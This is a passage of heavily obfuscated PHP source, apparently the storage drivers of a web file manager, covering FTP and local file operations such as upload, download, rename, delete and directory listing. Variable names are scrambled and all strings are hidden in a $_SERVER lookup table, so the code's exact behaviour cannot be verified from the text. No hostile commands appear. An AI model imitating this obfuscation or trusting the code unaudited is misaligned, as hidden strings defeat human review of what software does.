= $this->iconvApp($áë¢ÒÄš); $this->download($œº‰ÇÄ´, $ŒŞÕÄĞ); $èŠğô¢Õ = $this->upload($ÆáÖğ°Ÿ, $ŒŞÕÄĞ); $this->tempFileRemve($áë¢ÒÄš); return $èŠğô¢Õ; } public function moveFile($Ù¤²”æØ, $îÆåùŞÆ) { if (!$this->_isconn()) { return !1; } $Ù¤²”æØ = $this->iconvSystem($Ù¤²”æØ); $îÆåùŞÆ = $this->iconvSystem($îÆåùŞÆ); $ÌÌ¡‹’ü = @ftp_rename($this->connect, $Ù¤²”æØ, $îÆåùŞÆ); return $ÌÌ¡‹’ü ? $this->getPathOuter($îÆåùŞÆ) : !1; } public function delFile($Æ·«é™Ğ) { if (!$this->_isconn()) { return !1; } $Æ·«é™Ğ = $this->iconvSystem($Æ·«é™Ğ); return @ftp_delete($this->connect, $Æ·«é™Ğ); } public function delFolder($ëî˜·Ÿ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $È“¸ıú„ = $Œ—É˜êğ = array(); $this->fileList($ëî˜·Ÿ, $È“¸ıú„, $Œ—É˜êğ, !0); $this->listItemCache = !0; foreach ($Œ—É˜êğ as $ºŸ…ú) { $Ê™·Ã·® = $this->iconvSystem($ºŸ…ú[$_SERVER[óó‹¸‚å][32]]); $åü¸“œÜ = @ftp_delete($this->connect, $Ê™·Ã·®); if (!$åü¸“œÜ) { return !1; } } foreach ($È“¸ıú„ as $Ê™·Ã·®) { $Ê™·Ã·® = $this->iconvSystem($Ê™·Ã·®); $åü¸“œÜ = @ftp_rmdir($this->connect, $Ê™·Ã·®); if (!$åü¸“œÜ) { return !1; } } $ëî˜·Ÿ = $this->iconvSystem($ëî˜·Ÿ); return @ftp_rmdir($this->connect, $ëî˜·Ÿ); } public function rename($«î±Ü‘, $çÛÏÁ€®) { $Ëí½†‡¬ =& $_SERVER[óó‹¸‚å]; if (!$this->_isconn()) { return !1; } $ş ‘ğ›Ú = $this->fileNameAuto($this->pathFather($«î±Ü‘), $çÛÏÁ€®); $ş ‘ğ›Ú = $this->iconvSystem($ş ‘ğ›Ú); $«î±Ü‘ = $this->iconvSystem($«î±Ü‘); $“˜¼§ã = $this->pathFather($«î±Ü‘); $”´Å“¿Š = rtrim($“˜¼§ã, $Ëí½†‡¬[8]) . $Ëí½†‡¬[8] . $ş ‘ğ›Ú; $Ô¿‚Ñ§– = @ftp_rename($this->connect, $«î±Ü‘, $”´Å“¿Š); $”´Å“¿Š = $this->iconvApp($”´Å“¿Š); return $Ô¿‚Ñ§– ? $this->getPathOuter($”´Å“¿Š) : !1; } private function folderInfo($ÑìĞ„š, $¥ğ‚à©ù = false) { $Á±Áàëº =& $_SERVER[óó‹¸‚å]; $û®‘¢´û = array($Á±Áàëº[32] => $this->pathThis($ÑìĞ„š), $Á±Áàëº[84] => $this->getPathOuter($Á±Áàëº[8] . $ÑìĞ„š), $Á±Áàëº[33] => $Á±Áàëº[75]); if ($¥ğ‚à©ù) { return $û®‘¢´û; } $û®‘¢´û[$Á±Áàëº[200]] = $û®‘¢´û[$Á±Áàëº[85]] = 0; $û®‘¢´û[$Á±Áàëº[201]] = $û®‘¢´û[$Á±Áàëº[202]] = !0; return $û®‘¢´û; } private function fileInfo($§ë•üÕ, $ù’ğÅÎ = false, $Ë³çÇõ° = array()) { $å¤í©øÒ =& $_SERVER[óó‹¸‚å]; $‚ÙĞ‚¯ = array($å¤í©øÒ[32] => $this->pathThis($§ë•üÕ), $å¤í©øÒ[84] => $this->getPathOuter($å¤í©øÒ[8] . $§ë•üÕ), $å¤í©øÒ[33] => $å¤í©øÒ[199], $å¤í©øÒ[76] => isset($Ë³çÇõ°[$å¤í©øÒ[76]]) ? $Ë³çÇõ°[$å¤í©øÒ[76]] : 0, $å¤í©øÒ[174] => $this->ext($§ë•üÕ)); if ($ù’ğÅÎ) { return $‚ÙĞ‚¯; } $‚ÙĞ‚¯[$å¤í©øÒ[200]] = $‚ÙĞ‚¯[$å¤í©øÒ[85]] = 0; $‚ÙĞ‚¯[$å¤í©øÒ[201]] = $‚ÙĞ‚¯[$å¤í©øÒ[202]] = !0; $ñáâñ“˜ = $this->iconvSystem($§ë•üÕ); $‚ÙĞ‚¯[$å¤í©øÒ[85]] = @ftp_mdtm($this->connect, $ñáâñ“˜); if (empty($Ë³çÇõ°)) { $Ë³çÇõ° = $this->objectMeta($§ë•üÕ); if (!$Ë³çÇõ°) { return $‚ÙĞ‚¯; } } $‚ÙĞ‚¯[$å¤í©øÒ[76]] = $Ë³çÇõ°[$å¤í©øÒ[76]]; return $‚ÙĞ‚¯; } public function size($ÄÂ ó®) { $ÅÓ¼Î©ê = $this->objectMeta($ÄÂ ó®); return $ÅÓ¼Î©ê ? $ÅÓ¼Î©ê[$_SERVER[óó‹¸‚å][76]] : 0; } public function info($ËŠÕ®²) { if ($this->isFile($ËŠÕ®²)) { return $this->fileInfo($ËŠÕ®², 0); } else { if ($this->isFolder($ËŠÕ®²)) { return $this->folderInfo($ËŠÕ®²); } } return !1; } private function fileList($´Ø¨šğœ, &$œÚ¥ß·–, &$¾Í‹˜äª, $½Ùñ’ı³ = false) { $§ê×¬êœ =& $_SERVER[óó‹¸‚å]; $´Ø¨šğœ = $this->iconvSystem($´Ø¨šğœ); if (!$this->isFolder($´Ø¨šğœ)) { return !1; } @ftp_chdir($this->connect, $§ê×¬êœ[8]); $´Ø¨šğœ = rtrim($´Ø¨šğœ, $§ê×¬êœ[8]) . $§ê×¬êœ[8]; check_abort(); $Í‰á¤ = @ftp_rawlist($this->connect, $´Ø¨šğœ); if (!$Í‰á¤) { $Í‰á¤ = array(); } $ƒ•Œ‰“ = array($§ê×¬êœ[10] => 1, $§ê×¬êœ[1391] => 1); foreach ($Í‰á¤ as $´ù³ÁŸ´) { $Ñ¢­µáã = $this->_listItem($´ù³ÁŸ´); if ($Ñ¢­µáã[0] == $§ê×¬êœ[763]) { continue; } $Ò„åĞŸê = $Ñ¢­µáã[8]; if (empty($Ò„åĞŸê) && $Ò„åĞŸê !== $§ê×¬êœ[197] || isset($ƒ•Œ‰“[$Ò„åĞŸê])) { continue; } $Ò„åĞŸê = $this->iconvApp($´Ø¨šğœ . ltrim($Ò„åĞŸê, $§ê×¬êœ[8])); $é©“…Ñ = array($§ê×¬êœ[32] => $Ò„åĞŸê, $§ê×¬êœ[33] => $§ê×¬êœ[199], $§ê×¬êœ[76] => $Ñ¢­µáã[4]); if (substr($´ù³ÁŸ´, 0, 1) == $§ê×¬êœ[1392]) { $é©“…Ñ[$§ê×¬êœ[33]] = $§ê×¬êœ[75]; $é©“…Ñ[$§ê×¬êœ[76]] = 0; } $Ÿ£í›Ò = $é©“…Ñ[$§ê×¬êœ[33]] == $§ê×¬êœ[75] ? !0 : !1; $this->cacheMethodInfoSet($Ò„åĞŸê, $Ÿ£í›Ò, $é©“…Ñ); if ($Ÿ£í›Ò) { $œÚ¥ß·–[] = $Ò„åĞŸê; if ($½Ùñ’ı³) { $this->fileList($Ò„åĞŸê, $œÚ¥ß·–, $¾Í‹˜äª, $½Ùñ’ı³); } continue; } $¾Í‹˜äª[] = $é©“…Ñ; } $this->cacheMethodInfoSet($´Ø¨šğœ, !0); } private function _listItem($›¥­æÇÕ) { if (empty($›¥­æÇÕ)) { return array(); } $ûÑı¡€Ö = preg_split($_SERVER[óó‹¸‚å][1393], $›¥­æÇÕ); if (count($ûÑı¡€Ö) <= 9) { return $ûÑı¡€Ö; } $ûÑı¡€Ö[8] = trim(substr($›¥­æÇÕ, strpos($›¥­æÇÕ, $ûÑı¡€Ö[7]) + strlen($ûÑı¡€Ö[7]))); return array_splice($ûÑı¡€Ö, 0, 9); } public function listPath($„³ğŞˆ, $ñ‡×Âİü = false) { $ñ¶™×º =& $_SERVER[óó‹¸‚å]; if (!$this->_isconn()) { return !1; } $¼€¨ñ¾ = $ˆˆí˜§¼ = array(); $this->fileList($„³ğŞˆ, $¼€¨ñ¾, $ˆˆí˜§¼); foreach ($¼€¨ñ¾ as $–°óÈ±¼ => $ÑôÕß‡õ) { $¼€¨ñ¾[$–°óÈ±¼] = $this->folderInfo($ÑôÕß‡õ, $ñ‡×Âİü); } foreach ($ˆˆí˜§¼ as $–°óÈ±¼ => $ÑôÕß‡õ) { $ˆˆí˜§¼[$–°óÈ±¼] = $this->fileInfo($ÑôÕß‡õ[$ñ¶™×º[32]], $ñ‡×Âİü, $ÑôÕß‡õ); } return array($ñ¶™×º[82] => $¼€¨ñ¾, $ñ¶™×º[83] => $ˆˆí˜§¼); } public function has($³¤šñƒó, $£Öœì– = false, $ıÁ¾É¬ = true) { $íÇ”‡„Ò =& $_SERVER[óó‹¸‚å]; $ºëÜ´»û = $ÜÑ™åÌ = array(); $»À™«ùÛ = $£Öœì– ? !0 : !1; $this->fileList($³¤šñƒó, $ºëÜ´»û, $ÜÑ™åÌ, $»À™«ùÛ); if ($£Öœì–) { return array($íÇ”‡„Ò[207] => count($ÜÑ™åÌ), $íÇ”‡„Ò[208] => count($ºëÜ´»û)); } if ($ıÁ¾É¬) { if (count($ÜÑ™åÌ)) { return !0; } } else { if (count($ºëÜ´»û)) { return !0; } } return !1; } public function listAll($ñ®ìëÀ¯) { $®ĞŠ¿Ïï =& $_SERVER[óó‹¸‚å]; if (!$this->_isconn()) { return !1; } $œ¾ ‘©È = $¦ÅÙƒÁ¹ = array(); $this->fileList($ñ®ìëÀ¯, $œ¾ ‘©È, $¦ÅÙƒÁ¹, !0); $¦ßì³ìÎ = array(); foreach ($¦ÅÙƒÁ¹ as $û¼óØ¯£) { $¦ßì³ìÎ[$û¼óØ¯£[$®ĞŠ¿Ïï[32]]] = $û¼óØ¯£[$®ĞŠ¿Ïï[76]]; } foreach ($œ¾ ‘©È as $û¼óØ¯£) { if (is_string($û¼óØ¯£)) { $¦ßì³ìÎ[$û¼óØ¯£] = 0; } } return $this->listAllFiles($ñ®ìëÀ¯, array_keys($¦ßì³ìÎ), $¦ßì³ìÎ); } public function getContent($Á¶ß´ÍÊ) { if (!$this->_isconn()) { return !1; } $Á¶ß´ÍÊ = $this->iconvSystem($Á¶ß´ÍÊ); return $this->fileSubstr($Á¶ß´ÍÊ); } public function setContent($õ»ŞÄÕä, $ÖîÇĞİÚ = '') { if (!$this->_isconn()) { return !1; } $±Ğ›ÍÒ¼ = $this->pathThis($this->iconvSystem($õ»ŞÄÕä)); $…Âòã¿‹ = $this->tempFile($±Ğ›ÍÒ¼); file_put_contents($…Âòã¿‹, $ÖîÇĞİÚ); $’áĞÖ›Î = $this->upload($õ»ŞÄÕä, $this->iconvApp($…Âòã¿‹)); $this->tempFileRemve($…Âòã¿‹); return $’áĞÖ›Î; } public function fileSubstr($¾ùºÙà, $˜³ˆ”åˆ = 0, $âëİº‘ş = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¾ùºÙà, $˜³ˆ”åˆ, $âëİº‘ş); } private function ftpRequest($ÆœŠıÅÔ, $û¨ªšêÚ = 0, $¿Üú‹İÅ = false) { $ÆœŠıÅÔ = $this->iconvSystem($ÆœŠıÅÔ); $«ÙÏİö = $this->scheme . $this->host . $_SERVER[óó‹¸‚å][4] . $this->port; $­¢¶¬õ = curl_init(); curl_setopt($­¢¶¬õ, CURLOPT_URL, $«ÙÏİö . $this->pathEncode($ÆœŠıÅÔ)); curl_setopt($­¢¶¬õ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¿Üú‹İÅ) { $ü×íÓÄ­ = $û¨ªšêÚ + $¿Üú‹İÅ - 1; curl_setopt($­¢¶¬õ, CURLOPT_RANGE, "{$û¨ªšêÚ}\x2d{$ü×íÓÄ­}"); } curl_setopt($­¢¶¬õ, CURLOPT_RETURNTRANSFER, 1); $Á•ïƒîİ = curl_exec($­¢¶¬õ); curl_close($­¢¶¬õ); return $Á•ïƒîİ; } public function upload($ãçËšûû, $ê†Ò“Ş‘, $«¿ã¦Ñ = false, $Ã™øİí = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ãçËšûû))) { return !1; } $ãçËšûû = $this->iconvSystem($ãçËšûû); $ê†Ò“Ş‘ = $this->iconvSystem($ê†Ò“Ş‘); $œêÍ¶ ß = ftp_nb_put($this->connect, $ãçËšûû, $ê†Ò“Ş‘, FTP_BINARY); while ($œêÍ¶ ß == FTP_MOREDATA) { $œêÍ¶ ß = ftp_nb_continue($this->connect); } if ($œêÍ¶ ß != FTP_FINISHED) { return !1; } return $this->getPathOuter($ãçËšûû); } public function download($“£à¿¢Õ, $ëÜâÎıæ = '') { if (!$this->_isconn()) { return !1; } $šö§¡ı = $this->pathFather($ëÜâÎıæ); if (!IO::mkdir($šö§¡ı)) { return !1; } $“£à¿¢Õ = $this->iconvSystem($“£à¿¢Õ); $ëÜâÎıæ = $this->iconvSystem($ëÜâÎıæ); $èÍ¹Î­… = ftp_nb_get($this->connect, $ëÜâÎıæ, $“£à¿¢Õ, FTP_BINARY); while ($èÍ¹Î­… == FTP_MOREDATA) { $èÍ¹Î­… = ftp_nb_continue($this->connect); } if ($èÍ¹Î­… != FTP_FINISHED) { return !1; } return $this->iconvApp($ëÜâÎıæ); } public function exist($Óöã¿Á®) { return $this->isFile($Óöã¿Á®) || $this->isFolder($Óöã¿Á®); } public function isFile($Ú¾ÍËÑó) { return !$this->isFolder($Ú¾ÍËÑó) && $this->objectMeta($Ú¾ÍËÑó); } public function isFolder($Ê„­‹âõ) { return $this->cacheMethod($_SERVER[óó‹¸‚å][165], $Ê„­‹âõ); } protected function objectMeta($×ÎÙ†…°) { return $this->cacheMethod($_SERVER[óó‹¸‚å][167], $×ÎÙ†…°); } protected function _objectMeta($öğ—Ñ”) { $ãäõñÌ§ =& $_SERVER[óó‹¸‚å]; if ($öğ—Ñ” == $ãäõñÌ§[12] || $öğ—Ñ” == $ãäõñÌ§[8]) { return array(); } if (!$this->_isconn()) { return !1; } $öğ—Ñ” = $this->iconvSystem($öğ—Ñ”); $œÂë‘È¡ = array($ãäõñÌ§[32] => $this->iconvApp($öğ—Ñ”), $ãäõñÌ§[33] => $ãäõñÌ§[199], $ãäõñÌ§[76] => 0); @ftp_chdir($this->connect, $ãäõñÌ§[8]); $€äø”ó½ = @ftp_size($this->connect, $öğ—Ñ”); if ($€äø”ó½ != -1) { $œÂë‘È¡[$ãäõñÌ§[76]] = $€äø”ó½; } else { $°Ã¼Íãø = @ftp_chdir($this->connect, $öğ—Ñ”); if (!$°Ã¼Íãø) { return !1; } $œÂë‘È¡[$ãäõñÌ§[33]] = $ãäõñÌ§[75]; } return $œÂë‘È¡; } protected function _isFolder($Å•¶’²) { $İÃÀõ =& $_SERVER[óó‹¸‚å]; if ($Å•¶’² == $İÃÀõ[12] || $Å•¶’² == $İÃÀõ[8]) { return !0; } $ò™Îƒíñ = $this->_objectMeta($Å•¶’²); return isset($ò™Îƒíñ[$İÃÀõ[33]]) && $ò™Îƒíñ[$İÃÀõ[33]] == $İÃÀõ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÆæÔØ©Ÿ) { if (substr($ÆæÔØ©Ÿ, 0, 2) == $_SERVER[óó‹¸‚å][1384]) { $ÆæÔØ©Ÿ = BASIC_PATH . substr($ÆæÔØ©Ÿ, 2); } return $ÆæÔØ©Ÿ; } public function iconvApp($ã¤å‘‹õ) { $›ô¥¿à£ =& $_SERVER[óó‹¸‚å]; global $config; return $this->iconvTo($ã¤å‘‹õ, $config[$›ô¥¿à£[1382]], $config[$›ô¥¿à£[1381]]); } public function iconvSystem($ôıÖå÷‰) { $«à¸Ñò =& $_SERVER[óó‹¸‚å]; global $config; return $this->iconvTo($ôıÖå÷‰, $config[$«à¸Ñò[1381]], $config[$«à¸Ñò[1382]]); } public function getPathOuter($”˜úæš¦) { $—Ôµ¡¼ü =& $_SERVER[óó‹¸‚å]; $Ğ‹ë¾î = $this->iconvApp($this->pathBase); $”˜úæš¦ = $this->iconvApp($”˜úæš¦); if (substr($Ğ‹ë¾î, 0, 2) == $—Ôµ¡¼ü[1384]) { $Ğ‹ë¾î = BASIC_PATH . substr($Ğ‹ë¾î, 2); } if (substr($”˜úæš¦, 0, 2) == $—Ôµ¡¼ü[1384]) { $”˜úæš¦ = BASIC_PATH . substr($”˜úæš¦, 2); } $Ğ‹ë¾î = KodIO::clear($Ğ‹ë¾î); $”˜úæš¦ = KodIO::clear($”˜úæš¦); $”˜úæš¦ = substr($”˜úæš¦, strlen($Ğ‹ë¾î)); if (empty($this->pathDriver)) { return $”˜úæš¦; } return $this->pathDriver . $—Ôµ¡¼ü[8] . ltrim($”˜úæš¦, $—Ôµ¡¼ü[8]); } public function mkfile($‘²›´‰, $¦áá†©ñ = '', $—×é‰ = REPEAT_RENAME) { $‘²›´‰ = $this->iconvSystem($‘²›´‰); @touch($‘²›´‰); if ($¦áá†©ñ) { file_put_contents($‘²›´‰, $¦áá†©ñ); } @chmod($‘²›´‰, $this->pathAuth); return is_file($‘²›´‰) ? $this->getPathOuter($‘²›´‰) : !1; } public function mkdir($âƒüîŸµ, $¿°•›‰ = REPEAT_SKIP) { $âƒüîŸµ = $this->iconvSystem($âƒüîŸµ); if (is_dir($âƒüîŸµ)) { return $this->getPathOuter($âƒüîŸµ); } @mkdir($âƒüîŸµ, $this->pathAuth, !0); @chmod($âƒüîŸµ, $this->pathAuth); return is_dir($âƒüîŸµ) ? $this->getPathOuter($âƒüîŸµ) : !1; } public function copyFile($ßõ°éö¸, $¾À……) { $this->mkdir($this->pathFather($¾À……)); $ßõ°éö¸ = $this->iconvSystem($ßõ°éö¸); $¾À…… = $this->iconvSystem($¾À……); $—†íª‹” = copy_64($ßõ°éö¸, $¾À……); @chmod($¾À……, $this->pathAuth); return $—†íª‹” ? $this->getPathOuter($¾À……) : !1; } public function moveFile($ß¿º€ò¤, $Ë¦öˆº˜) { $this->mkdir($this->pathFather($Ë¦öˆº˜)); $ß¿º€ò¤ = $this->iconvSystem($ß¿º€ò¤); $Ë¦öˆº˜ = $this->iconvSystem($Ë¦öˆº˜); $ó¸»âÇ¾ = intval(@rename($ß¿º€ò¤, $Ë¦öˆº˜)); if (!$ó¸»âÇ¾) { if ($ó¸»âÇ¾ = intval(@copy_64($ß¿º€ò¤, $Ë¦öˆº˜))) { @unlink($ß¿º€ò¤); } } @chmod($Ë¦öˆº˜, $this->pathAuth); return $ó¸»âÇ¾ ? $this->getPathOuter($Ë¦öˆº˜) : !1; } public function movePath($‹£‰­Â, $„ÌÉ×É, $ÚŠ¤Õ£í = false) { $°ŸãÍ±… =& $_SERVER[óó‹¸‚å]; $‹£‰­Â = $this->iconvSystem($‹£‰­Â); $„ÌÉ×É = $this->iconvSystem($„ÌÉ×É); $Àœ±¡ğ½ = rtrim($„ÌÉ×É, $°ŸãÍ±…[8]) . $°ŸãÍ±…[8] . ($ÚŠ¤Õ£í ? $ÚŠ¤Õ£í : get_path_this($‹£‰­Â)); if (file_exists($Àœ±¡ğ½)) { return !1; } $÷ŞÖ¿” = intval(@rename($‹£‰­Â, $Àœ±¡ğ½)); $÷ŞÖ¿” = file_exists($Àœ±¡ğ½); return $÷ŞÖ¿” ? $this->getPathOuter($Àœ±¡ğ½) : !1; } public function delFile($çò°—Êï) { $çò°—Êï = $this->iconvSystem($çò°—Êï); if (!@unlink($çò°—Êï)) { @chmod($çò°—Êï, $this->pathAuth); if (!@unlink($çò°—Êï)) { return !1; } } else { return !0; } } public function delFolder($À•¦ƒÁÆ) { $’¿‡ü‡ =& $_SERVER[óó‹¸‚å]; $À•¦ƒÁÆ = $this->iconvSystem($À•¦ƒÁÆ); if (!is_dir($À•¦ƒÁÆ)) { return !0; } if (!($¾ïŞä—ª = opendir($À•¦ƒÁÆ))) { return !1; } while (($ÈÜèÖ¼ƒ = readdir($¾ïŞä—ª)) !== !1) { if ($ÈÜèÖ¼ƒ == $’¿‡ü‡[10] || $ÈÜèÖ¼ƒ == $’¿‡ü‡[1391]) { continue; } $„Æ´ÉÉ› = $À•¦ƒÁÆ . $’¿‡ü‡[8] . $ÈÜèÖ¼ƒ; if (is_file($„Æ´ÉÉ›) || is_link($„Æ´ÉÉ›)) { if (!unlink($„Æ´ÉÉ›)) { chmod($„Æ´ÉÉ›, $this->pathAuth); if (!unlink($„Æ´ÉÉ›)) { return !1; } } } else { if (is_dir($„Æ´ÉÉ›)) { chmod($„Æ´ÉÉ›, $this->pathAuth); $„Æ´ÉÉ› = $this->iconvApp($„Æ´ÉÉ›); if (!$this->delFolder($„Æ´ÉÉ›)) { return !1; } } } } closedir($¾ïŞä—ª); return rmdir($À•¦ƒÁÆ); } public function rename($Î¿“ã»û, $íÄ÷ûÃ›) { $¿ıã­ñ =& $_SERVER[óó‹¸‚å]; $Â±é·—ù = $this->fileNameAuto($this->pathFather($Î¿“ã»û), $íÄ÷ûÃ›); $Â±é·—ù = $this->iconvSystem($Â±é·—ù); $Î¿“ã»û = $this->iconvSystem($Î¿“ã»û); $œÉë²¾Ô = $this->pathFather($Î¿“ã»û); $ÌÛÁìù = rtrim($œÉë²¾Ô, $¿ıã­ñ[8]) . $¿ıã­ñ[8] . $Â±é·—ù; $Ùªîû×â = @rename($Î¿“ã»û, $ÌÛÁìù); $ÌÛÁìù = $this->iconvApp($ÌÛÁìù); return $Ùªîû×â ? $this->getPathOuter($ÌÛÁìù) : !1; } public function size($û¤÷¤üÓ) { $û¤÷¤üÓ = $this->iconvSystem($û¤÷¤üÓ); return filesize_64($û¤÷¤üÓ); } public function info($‡³£–›) { $‡³£–› = $this->iconvSystem($‡³£–›); if ($this->isFolder($‡³£–›)) { return $this->folderInfo($‡³£–›); } else { if ($this->isFile($‡³£–›)) { return $this->fileInfo($‡³£–›); } } return !1; } protected function infoChildren($Ş¨Èİ¥¤, &$¨€—€£ı, $„ÏŒ×µï = true) { $ş’ÅÌê =& $_SERVER[óó‹¸‚å]; check_abort_echo(); $Ş¨Èİ¥¤ = rtrim($Ş¨Èİ¥¤, $ş’ÅÌê[8]) . $ş’ÅÌê[8]; if ($„ÏŒ×µï) { $Ş¨Èİ¥¤ = $this->iconvSystem($Ş¨Èİ¥¤); } if (!($§ˆã›×î = @opendir($Ş¨Èİ¥¤))) { return; } while (($€ñÒŞº° = readdir($§ˆã›×î)) !== !1) { if ($€ñÒŞº° == $ş’ÅÌê[10] || $€ñÒŞº° == $ş’ÅÌê[1391]) { continue; } $‘Ãšµ„¬ = $Ş¨Èİ¥¤ . $€ñÒŞº°; if (is_file($‘Ãšµ„¬) || is_link($‘Ãšµ„¬)) { $¨€—€£ı[$ş’ÅÌê[77]]++; $¨€—€£ı[$ş’ÅÌê[76]] += filesize_64($‘Ãšµ„¬); } else { if (is_dir($‘Ãšµ„¬)) { $¨€—€£ı[$ş’ÅÌê[78]]++; $this->infoChildren($‘Ãšµ„¬, $¨€—€£ı, !1); } } } closedir($§ˆã›×î); } private function folderInfo($°›”°Ø», $à­ÛıÀï = false) { $“ÒÛ·Ÿ =& $_SERVER[óó‹¸‚å]; $°›”°Ø» = rtrim($°›”°Ø», $“ÒÛ·Ÿ[8]) . $“ÒÛ·Ÿ[8]; $º÷ÇÔíÕ = $this->iconvApp($this->pathThis($°›”°Ø»)); if ($à­ÛıÀï) { return array($“ÒÛ·Ÿ[32] => $º÷ÇÔíÕ, $“ÒÛ·Ÿ[84] => $this->getPathOuter($°›”°Ø»), $“ÒÛ·Ÿ[33] => $“ÒÛ·Ÿ[75]); } $€œõ®• = array($“ÒÛ·Ÿ[32] => $º÷ÇÔíÕ, $“ÒÛ·Ÿ[84] => $this->getPathOuter($°›”°Ø»), $“ÒÛ·Ÿ[33] => $“ÒÛ·Ÿ[75], $“ÒÛ·Ÿ[200] => @filectime($°›”°Ø»), $“ÒÛ·Ÿ[85] => @filemtime($°›”°Ø»), $“ÒÛ·Ÿ[1394] => @fileatime($°›”°Ø»), $“ÒÛ·Ÿ[1395] => is_readable($°›”°Ø»), $“ÒÛ·Ÿ[1396] => is_writable($°›”°Ø»), $“ÒÛ·Ÿ[1397] => get_mode($°›”°Ø»)); return $€œõ®•; } private function fileInfo($äÎÜ’÷™, $éù—ëî  = false) { $ä‰•Ü‡Æ =& $_SERVER[óó‹¸‚å]; $‰¯¦“Œ  = $this->iconvApp($this->pathThis($äÎÜ’÷™)); if ($éù—ëî ) { return array($ä‰•Ü‡Æ[32] => $‰¯¦“Œ , $ä‰•Ü‡Æ[84] => $this->getPathOuter($äÎÜ’÷™), $ä‰•Ü‡Æ[33] => $ä‰•Ü‡Æ[199], $ä‰•Ü‡Æ[76] => $this->size($äÎÜ’÷™), $ä‰•Ü‡Æ[174] => $this->ext($‰¯¦“Œ )); } $„éŒ«› = array($ä‰•Ü‡Æ[32] => $‰¯¦“Œ , $ä‰•Ü‡Æ[84] => $this->getPathOuter($äÎÜ’÷™), $ä‰•Ü‡Æ[33] => $ä‰•Ü‡Æ[199], $ä‰•Ü‡Æ[200] => @filectime($äÎÜ’÷™), $ä‰•Ü‡Æ[85] => @filemtime($äÎÜ’÷™), $ä‰•Ü‡Æ[1394] => @fileatime($äÎÜ’÷™), $ä‰•Ü‡Æ[76] => $this->size($äÎÜ’÷™), $ä‰•Ü‡Æ[174] => $this->ext($‰¯¦“Œ ), $ä‰•Ü‡Æ[1395] => is_readable($äÎÜ’÷™), $ä‰•Ü‡Æ[1396] => is_writable($äÎÜ’÷™), $ä‰•Ü‡Æ[1397] => get_mode($äÎÜ’÷™)); return $„éŒ«›; } public function exist($á—ÒÓñ×) { $á—ÒÓñ× = $this->iconvSystem($á—ÒÓñ×); return @file_exists($á—ÒÓñ×); } public function isFile($£¼İã¸ü) { $£¼İã¸ü = $this->iconvSystem($£¼İã¸ü); return @is_file($£¼İã¸ü); } public function isFolder($Ÿ‰€ÌÈâ) { $Ÿ‰€ÌÈâ = $this->iconvSystem($Ÿ‰€ÌÈâ); return @is_dir($Ÿ‰€ÌÈâ); } public function listPath($ÒÏæ’º€, $ò•–Œ’ƒ = false) { $ÆÔ‰ÔĞˆ =& $_SERVER[óó‹¸‚å]; $ÒÏæ’º€ = $this->iconvSystem($ÒÏæ’º€); $ÒÏæ’º€ = rtrim($ÒÏæ’º€, $ÆÔ‰ÔĞˆ[8]) . $ÆÔ‰ÔĞˆ[8]; $Ü”œÕ˜æ = array($ÆÔ‰ÔĞˆ[82] => array(), $ÆÔ‰ÔĞˆ[83] => array()); if (!($æşôËéæ = @opendir($ÒÏæ’º€))) { return $Ü”œÕ˜æ; } while (($³œ˜¡ô = readdir($æşôËéæ)) !== !1) { if ($³œ˜¡ô == $ÆÔ‰ÔĞˆ[10] || $³œ˜¡ô == $ÆÔ‰ÔĞˆ[1391]) { continue; } $ñöÙìüË = $ÒÏæ’º€ . $³œ˜¡ô; if (is_file($ñöÙìüË)) { $Ü”œÕ˜æ[$ÆÔ‰ÔĞˆ[83]][] = $this->fileInfo($ñöÙìüË, $ò•–Œ’ƒ); } else { $Ü”œÕ˜æ[$ÆÔ‰ÔĞˆ[82]][] = $this->folderInfo($ñöÙìüË, $ò•–Œ’ƒ); } } closedir($æşôËéæ); return $Ü”œÕ˜æ; } public function listAll($‡Ñ†ÕÚ, &$ò¹­ñ‰­ = array()) { $€½áÃî‚ =& $_SERVER[óó‹¸‚å]; $‡Ñ†ÕÚ = $this->iconvSystem($‡Ñ†ÕÚ); $‡Ñ†ÕÚ = rtrim($‡Ñ†ÕÚ, $€½áÃî‚[8]) . $€½áÃî‚[8]; if (!($ŸùÓà¬é = @opendir($‡Ñ†ÕÚ))) { return $ò¹­ñ‰­; } while (($ŸÌÁÇ¦Á = readdir($ŸùÓà¬é)) !== !1) { if ($ŸÌÁÇ¦Á == $€½áÃî‚[10] || $ŸÌÁÇ¦Á == $€½áÃî‚[1391]) { continue; } $Ûµ¹×¾¨ = $‡Ñ†ÕÚ . $ŸÌÁÇ¦Á; if (is_dir($Ûµ¹×¾¨) && !is_link($Ûµ¹×¾¨)) { $ò¹­ñ‰­[] = array($€½áÃî‚[84] => $Ûµ¹×¾¨ . $€½áÃî‚[8], $€½áÃî‚[75] => 1, $€½áÃî‚[85] => @filemtime($Ûµ¹×¾¨), $€½áÃî‚[76] => 0); $this->listAll($Ûµ¹×¾¨, $ò¹­ñ‰­); } else { $ò¹­ñ‰­[] = array($€½áÃî‚[84] => $Ûµ¹×¾¨, $€½áÃî‚[75] => 0, $€½áÃî‚[85] => @filemtime($Ûµ¹×¾¨), $€½áÃî‚[76] => $this->size($Ûµ¹×¾¨)); } } closedir($ŸùÓà¬é); return $ò¹­ñ‰­; } public function has($çùº­ú¯, $Ğ¦Ñ›³î = false, $ãˆÆ Õü = true) { $‡¦úÚá =& $_SERVER[óó‹¸‚å]; $çùº­ú¯ = $this->iconvSystem($çùº­ú¯); $çùº­ú¯ = rtrim($çùº­ú¯, $‡¦úÚá[8]) . $‡¦úÚá[8]; if (!($«Ãøµ‘ = @opendir($çùº­ú¯))) { return !1; } $âÛƒŠªï = 0; $áäĞŞ¾ó = 0; $íüèçı» = 0; while (($ßË¯º‰¿ = readdir($«Ãøµ‘)) !== !1) { if ($ßË¯º‰¿ == $‡¦úÚá[10] || $ßË¯º‰¿ == $‡¦úÚá[1391]) { continue; } $ı±¸ÚÔú = $çùº­ú¯ . $ßË¯º‰¿; if ($Ğ¦Ñ›³î) { $íüèçı»++; if (@is_file($ı±¸ÚÔú)) { $âÛƒŠªï++; } else { $áäĞŞ¾ó++; } if ($íüèçı» > 10000) { break; } continue; } if ($ãˆÆ Õü) { if (@is_file($ı±¸ÚÔú)) { return !0; } } else { if 